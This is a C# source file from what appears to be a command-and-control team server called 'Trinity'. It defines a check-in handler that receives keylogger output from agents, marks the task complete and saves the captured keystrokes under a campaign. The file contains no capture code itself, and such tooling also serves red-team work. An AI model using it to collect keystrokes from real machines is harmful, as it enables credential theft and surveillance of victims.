using System.Text.Json;
using TeamServer.Interface;
using TeamServer.Repositories;
using Trinity.Shared.DTOs.Task;
using Trinity.Shared.Enums.Tasks;
using Trinity.Shared.Interfaces;
using Trinity.Shared.Models;
using SystemTask = System.Threading.Tasks.Task;

namespace TeamServer.Handlers.CheckinHandler.Strategies;

public sealed class KeyloggerStrategy : ICheckinStrategy
{
    private readonly TaskRepository _taskRepository;
    private readonly AgentRepository _agentRepository;
    private readonly IKeyloggerService _keyloggerService;

    public KeyloggerStrategy(
        TaskRepository taskRepository,
        AgentRepository agentRepository,
        IKeyloggerService keyloggerService)
    {
        _taskRepository = taskRepository;
        _agentRepository = agentRepository;
        _keyloggerService = keyloggerService;
    }

    public async SystemTask ProcessResponseAsync(JsonElement element)
    {
        var taskId = element.GetProperty("TaskID").GetInt32();
        var task = await _taskRepository.GetByIdAsync(taskId)
            ?? throw new ArgumentException($"Task '{taskId}' does not exist.", nameof(element));
        var response = JsonSerializer.Deserialize<TaskResp<TaskSuccessResponse>>(element)
            ?? throw new JsonException("The keylogger response was invalid.");
        var agent = await _agentRepository.GetAgentByIDAsync(task.AgentID)
            ?? throw new ArgumentException($"Agent '{task.AgentID}' does not exist.", nameof(element));

        task.Status = Status.SUCCESS;
        task.Result = new TaskResult { TaskID = task.ID, Result = response.Data.Output };
        await _keyloggerService.SaveDataAsync(agent.CampaignID, response.Data.Output);
        await _taskRepository.CommitAsync();
    }
}
